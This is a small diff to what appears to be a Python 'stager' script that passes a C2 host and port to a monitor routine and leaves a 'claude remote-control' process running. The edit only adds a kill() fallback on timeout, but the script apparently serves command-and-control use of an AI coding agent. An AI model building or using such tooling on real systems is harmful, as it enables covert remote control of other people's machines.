@@ -141,7 +141,10 @@ def main() -> None:
         monitor(proc, args.c2_host, args.c2_port)
     except KeyboardInterrupt:
         proc.terminate()
-        proc.wait(timeout=5)
+        try:
+            proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            proc.kill()
 
     print(
         f"[stager] done. claude remote-control remains running (PID {proc.pid}).",
